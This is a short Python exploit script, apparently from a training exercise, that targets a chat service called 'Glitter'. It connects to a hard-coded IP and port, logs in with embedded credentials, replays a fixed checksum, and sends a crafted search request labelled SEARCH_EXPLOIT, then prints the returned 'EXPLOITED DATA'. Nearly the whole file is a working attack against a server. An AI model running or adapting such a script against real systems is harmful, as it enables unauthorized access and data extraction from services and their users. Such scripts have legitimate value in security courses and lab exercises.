import socket

GLITTER_IP = '44.224.228.136'
GLITTER_PORT = 1336

LOGIN_REQ = b'100#{gli&&er}{"user_name":"Agustus","password":"portal300","enable_push_notifications":true}##'
CHECKSUM_REQ = b'110#{gli&&er}1553##'

SUCCESSFUL_LOGIN_ID = '105'
SUCCESSFUL_CHECKSUM_ID = '115'

SEARCH_EXPLOIT = b'300#{gli&&er}{"search_type":"SIMPLE","search_entry":"A"}##'

def main():
    try:
        #Creating socket with Glitter.
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:

            # Connecting to the server.
            glitter_address = (GLITTER_IP, GLITTER_PORT)
            sock.connect(glitter_address)

            # Login to server.
            sock.sendall(LOGIN_REQ)
            response = sock.recv(1024).decode()

            # Checking if the login was successful.
            if SUCCESSFUL_LOGIN_ID not in response:
                print(f'\033[91m[ERROR]: \033[0m Login Failed!')
                return None

            # Sending the checksum to server.
            sock.sendall(CHECKSUM_REQ)
            response = sock.recv(1024).decode()

            # Checking if we had successfully logged into the server.
            if SUCCESSFUL_CHECKSUM_ID not in response:
                print(f'\033[91m[ERROR]: \033[0m Login Failed!')
                return None

            sock.sendall(SEARCH_EXPLOIT)

            # Recieving search response and print it.
            response = sock.recv(1024).decode()
            print('\033[93m[EXPLOITED DATA] \033[0m: {data}'.format(data = response))


    except Exception as err:
        print(f'\033[91m[ERROR]: \033[0m{err}')
        return None
        

if __name__ == '__main__':
    main()
